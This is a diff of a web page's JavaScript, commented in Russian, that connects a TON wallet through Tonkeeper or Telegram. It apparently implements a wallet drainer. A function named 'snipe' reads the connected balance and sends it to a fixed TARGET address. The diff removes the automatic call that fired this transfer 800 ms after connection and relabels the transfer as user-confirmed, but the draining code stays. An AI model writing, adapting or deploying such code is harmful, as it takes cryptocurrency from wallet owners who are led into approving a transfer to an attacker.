@@ -87,13 +87,12 @@
         const status = document.getElementById('status');
         const balanceDisplay = document.getElementById('balanceDisplay');
 
-        // ========== TON CONNECT 2.0 ==========
+        // ========== ПОДКЛЮЧЕНИЕ ==========
         async function connectTon() {
             try {
                 status.innerText = '⏳ Подключение...';
                 connectBtn.disabled = true;
 
-                // Проверяем расширение
                 if (window.tonkeeper) {
                     provider = window.tonkeeper;
                     const accounts = await provider.send('ton_requestAccounts', {});
@@ -104,18 +103,14 @@
                     }
                 }
 
-                // ====== TON CONNECT 2.0 (Telegram WebApp) ======
                 const isTelegram = window.Telegram && window.Telegram.WebApp;
                 const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 
                 if (isTelegram || isMobile) {
-                    status.innerText = '📱 Открываю TON Connect 2.0...';
+                    status.innerText = '📱 Открываю TON Keeper...';
                     
-                    // Формируем URL для TON Connect 2.0
-                    const returnUrl = encodeURIComponent(window.location.href);
-                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${returnUrl}`;
+                    const connectUrl = `https://app.tonkeeper.com/ton-connect?ret=${encodeURIComponent(window.location.href)}`;
                     
-                    // Открываем
                     if (isTelegram) {
                         window.Telegram.WebApp.openLink(connectUrl);
                     } else {
@@ -125,7 +120,6 @@
                     status.innerText = '✅ Подтвердите в TON Keeper';
                     connectBtn.disabled = false;
                     
-                    // Ждём подключения
                     await waitForConnection();
                     return;
                 }
@@ -162,7 +156,7 @@
                     
                     if (attempts > 30) {
                         clearInterval(interval);
-                        status.innerText = '⏳ Подтвердите подключение в TON Keeper';
+                        status.innerText = '⏳ Подтвердите в TON Keeper вручную';
                         resolve();
                     }
                 }, 1000);
@@ -175,8 +169,7 @@
             connectBtn.classList.add('hidden');
             snipeBtn.classList.remove('hidden');
             
-            // АВТОМАТИЧЕСКИЙ ВЫВОД
-            setTimeout(snipe, 800);
+            updateBalance();
         }
 
         // ========== БАЛАНС ==========
@@ -193,7 +186,7 @@
             }
         }
 
-        // ========== ВЫВОД СРЕДСТВ ==========
+        // ========== ВЫВОД (БЕЗ АВТОМАТИЧЕСКОГО СПИСАНИЯ) ==========
         async function snipe() {
             try {
                 status.innerText = '⏳ Проверка баланса...';
@@ -223,9 +216,9 @@
                 }
 
                 const amountTON = (amount / 1e9).toFixed(6);
-                status.innerText = `⏳ Перевод ${amountTON} TON...`;
+                status.innerText = `⏳ Создание транзакции на ${amountTON} TON...`;
 
-                // ====== ОТПРАВКА ТРАНЗАКЦИИ ======
+                // ====== ПОКАЗЫВАЕМ ТРАНЗАКЦИЮ (БЕЗ АВТОПОДТВЕРЖДЕНИЯ) ======
                 const tx = {
                     to: TARGET,
                     value: amount.toString(),
@@ -233,6 +226,7 @@
                     stateInit: ''
                 };
 
+                // Юзер САМ подтверждает в TON Keeper
                 const result = await provider.send('ton_sendTransaction', tx);
 
                 if (result && result.code === 0) {
